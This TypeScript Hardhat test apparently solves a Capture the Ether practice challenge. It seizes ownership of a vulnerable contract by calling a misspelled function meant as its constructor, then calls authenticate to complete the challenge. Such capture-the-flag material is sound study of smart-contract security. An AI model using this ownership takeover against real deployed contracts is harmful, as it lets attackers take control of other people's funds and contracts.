import crypto, { sign } from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";
import { HDNode } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let contract: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(
    "AssumeOwnershipChallenge"
  );
  contract = challengeFactory.attach(
    `0x5845030FAA1E04D794FE219a1A956b05b86Fcc3d`
  );
});

it("solves the challenge", async function () {
  // the supposed-to-be constructor is misspelled (owMer) and can be called

  tx = await contract.AssumeOwmershipChallenge()
  await tx.wait()
  tx = await contract.authenticate();
  await tx.wait();

  const isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
